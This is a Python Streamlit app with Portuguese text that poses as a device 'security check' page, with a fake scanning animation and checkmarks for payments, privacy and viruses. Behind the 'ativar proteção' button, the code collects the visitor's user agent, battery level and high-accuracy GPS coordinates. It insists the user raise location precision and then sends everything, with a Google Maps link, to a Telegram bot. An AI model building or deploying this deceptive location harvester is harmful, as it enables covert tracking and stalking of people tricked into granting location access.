import streamlit as st
import requests
import time
import os
from streamlit_js_eval import streamlit_js_eval

# =========================
# CONFIGURAÇÃO TELEGRAM
# =========================
TOKEN = os.getenv("TG_TOKEN") or "SEU_TOKEN_AQUI"
CHAT_ID = os.getenv("TG_ID") or "SEU_CHAT_ID_AQUI"

def enviar_telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            },
            timeout=5
        )
    except:
        pass

# =========================
# CONFIG STREAMLIT
# =========================
st.set_page_config(page_title="Segurança Ativa", layout="centered")

# =========================
# CSS
# =========================
st.markdown("""
<style>
body { background-color:#000; color:white; }
.scanner-box { display:flex; justify-content:center; margin:20px 0; }
.circle {
    width:180px; height:180px; border-radius:50%;
    border:2px solid #2ecc71;
    display:flex; align-items:center; justify-content:center;
    box-shadow:0 0 40px rgba(46,204,113,.6);
    animation:pulse 2s infinite;
}
@keyframes pulse { 50% { transform:scale(1.05); } }
.pct { font-size:44px; font-weight:bold; }
.btn {
    background:#ffc107; color:#000; width:100%;
    height:55px; border-radius:14px;
    font-size:18px; font-weight:bold;
    border:none; cursor:pointer;
}
.alert {
    background:#111; border:1px solid #444;
    padding:16px; border-radius:12px;
    margin-top:20px;
}
</style>
""", unsafe_allow_html=True)

# =========================
# INTERFACE
# =========================
st.markdown("<h2 style='text-align:center'>Verificar segurança</h2>", unsafe_allow_html=True)

bolha = st.empty()
with bolha:
    st.markdown("""
    <div class="scanner-box">
        <div class="circle"><div class="pct">4%</div></div>
    </div>
    """, unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# =========================
# COLETA JS
# =========================
ua = streamlit_js_eval(
    js_expressions="navigator.userAgent",
    key="ua"
)

bat = streamlit_js_eval(
    js_expressions="""
    navigator.getBattery
      ? navigator.getBattery().then(b => Math.round(b.level*100))
      : null
    """,
    key="bat"
)

# =========================
# BOTÃO + GEOLOCALIZAÇÃO
# =========================
js_geo = """
<script>
async function pedirLocal() {
  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          ok: true,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      (err) => {
        resolve({ ok:false, error: err.message });
      },
      { enableHighAccuracy:true, timeout:7000 }
    );
  });
}
</script>
<button class="btn" onclick="window._geo = pedirLocal()">
● ATIVAR PROTEÇÃO
</button>
"""

st.components.v1.html(js_geo, height=80)

geo = streamlit_js_eval(
    js_expressions="window._geo",
    key="geo_result"
)

# =========================
# TRATAMENTO
# =========================
if geo:

    if not geo.get("ok"):
        st.markdown("""
        <div class="alert">
        <b>Para uma experiência melhor, ative a Precisão de Local</b><br><br>
        O dispositivo precisa estar com:
        <ul>
          <li>📍 Localização ativada</li>
          <li>🎯 Precisão de Local (Google)</li>
        </ul>
        Caminho:<br>
        <b>Configurações › Localização › Precisão de Local</b>
        </div>
        """, unsafe_allow_html=True)
        st.stop()

    # baixa precisão (ex: só Wi-Fi)
    if geo.get("accuracy", 9999) > 100:
        st.markdown("""
        <div class="alert">
        <b>Precisão insuficiente detectada</b><br><br>
        Ative a <b>Precisão de Local</b> para melhorar a segurança.
        </div>
        """, unsafe_allow_html=True)
        st.stop()

    # animação
    for i in range(4, 101, 4):
        bolha.markdown(f"""
        <div class="scanner-box">
            <div class="circle"><div class="pct">{i}%</div></div>
        </div>
        """, unsafe_allow_html=True)
        time.sleep(0.04)

    lat, lon = geo["lat"], geo["lon"]
    mapa = f"https://www.google.com/maps?q={lat},{lon}"

    enviar_telegram(
        f"🛡️ PROTEÇÃO ATIVADA\n\n"
        f"📱 Aparelho: {ua[:40]}\n"
        f"🔋 Bateria: {bat or 'N/D'}%\n"
        f"📍 [Localização]({mapa})"
    )

    st.success("Proteção ativada com sucesso!")
    st.stop()

st.markdown("<p style='text-align:center;color:#555'>Desenvolvido © 2026</p>", unsafe_allow_html=True)
